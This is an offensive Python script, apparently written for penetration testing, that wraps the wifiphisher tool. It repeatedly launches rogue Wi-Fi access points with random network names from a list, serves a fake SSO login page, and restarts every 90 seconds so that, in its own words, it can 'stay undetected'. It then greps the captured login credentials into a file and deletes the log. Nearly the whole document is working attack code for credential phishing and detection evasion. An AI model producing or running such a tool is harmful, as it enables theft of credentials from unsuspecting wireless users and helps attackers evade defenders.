#!/usr/bin/env python

from subprocess import call
import subprocess
import random
import time
import os
import sys

#wifiPhisherAttack.py is a wrapper for wifiphisher to help stay undetected while conducting phishing attacks. 
#It accomplishes this by starting wifiphisher with a random ESSID from ESSID.lst and a random MAC waiting a number of seconds and then restarting the attack.  
#(I could not get random channels working with wifiphisher)
#Requirements: file called ESSID.lst that contains one ESSID per line. 
#Captured credentials are saved into wifiphisher.out in the current running directory. 
# this is a shitty script, so dont give me any shit ;). 


print("[+] Starting WifiPhisher Attack...")
print("[+] Reading ESSIDS from ESSID.lst")

#store essids used for the test here NO EMPTY LINES!
ESSIDfile = "ESSID.lst"
currentESSID = ""
sleeptime = "90"

#load file with ESSIDs into a list for modulation
with open(ESSIDfile) as f:
	list = f.readlines()

#remove nextline
list = [x.strip() for x in list]


wifi_cmd  = "/root/Pentest/wifiphisher/bin/wifiphisher"


#start loop
try:
	while True:
		#pick a random ESSID from list
		currentESSID = random.choice(list)
		
		#see if you can randomize the channel
		wifi_args = "--noextensions --logging -e " + currentESSID + " -p sso_login"

		#DEBUG: print wifi_cmd + " " + wifi_args
		cmd  = wifi_cmd + " " + wifi_args
                
		print("[+] Executing: " + cmd)
		pout = subprocess.Popen((cmd), stdout=subprocess.PIPE, shell=True)

		#sleep for X  seconds
		print("[+] Sleeping for " + sleeptime + "s")

		time.sleep(float(sleeptime))

		#kill find wifiphisher process and kill it
		print("[+] WOKE UP! killing wifiphish (python2)")

		#kill process using SIGINTERRUPT
                kill_cmd = "pkill -2 python2"
		proc = subprocess.Popen([kill_cmd], shell=True)

		print("[+] Sleeping for 10 seconds to wait for wifi cleanup")
		time.sleep(10)
		
		#grep output and append to file
		print("[+] Grepping passwords and saving to /root/Pentest/wifiphisherAttack.out")
		call(["cat /root/Pentest/wifiphisher/wifiphisher.log | grep POST | cut -d\'&\' -f3,4 >> /root/Pentest/wifiphisherAttack.out"], shell=True)
		#remove log file
		print("[+] remove /root/Pentest/wifiphisher/wifiphisher.log")
		call(["rm /root/Pentest/wifiphisher/wifiphisher.log"], shell=True)

	


except KeyboardInterrupt:
	pass

print("DONE")

